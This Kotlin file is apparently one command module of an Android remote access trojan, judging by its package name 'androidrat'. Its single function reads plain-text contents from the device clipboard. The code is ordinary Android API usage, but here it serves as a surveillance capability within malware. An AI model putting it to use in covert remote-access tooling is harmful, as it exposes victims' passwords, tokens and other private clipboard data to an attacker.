package com.nqmgaming.androidrat.command

import android.content.ClipDescription
import android.content.ClipboardManager
import android.content.Context
import androidx.core.content.ContextCompat

object ReadFromClipboard {
    fun readFromClipboard(context: Context): String? {
        var result: String? = null
        val clipboardManager = ContextCompat.getSystemService(context, ClipboardManager::class.java)
        if (clipboardManager?.hasPrimaryClip() == true) {
            val clip = clipboardManager.primaryClip
            if (clip?.description?.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN) == true) {
                val item = clip.getItemAt(0)
                result = item.text.toString()
            }
        }
        return result
    }
}